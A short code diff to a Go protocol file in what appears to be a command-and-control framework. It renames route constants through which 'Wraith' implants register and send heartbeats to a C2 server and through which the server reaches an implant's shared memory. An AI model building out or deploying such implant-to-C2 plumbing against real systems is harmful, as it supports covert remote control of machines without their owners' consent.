@@ -1,9 +1,9 @@
 package proto
 
 const (
-	// Wraiths hit this endpoint on the c2 to fetch a registration token.
-	ROUTE_REG = "r"
+	// Wraiths hit this endpoint on the c2 to register their existence.
+	ROUTE_HEARTBEAT = "h"
 
-	// The c2 hits this endpoint to send data to a Wraith and receive a response.
-	ROUTE_CMD = "c"
+	// The c2 hits this endpoint to access the Wraith SHM.
+	ROUTE_EXCHANGE = "x"
 )
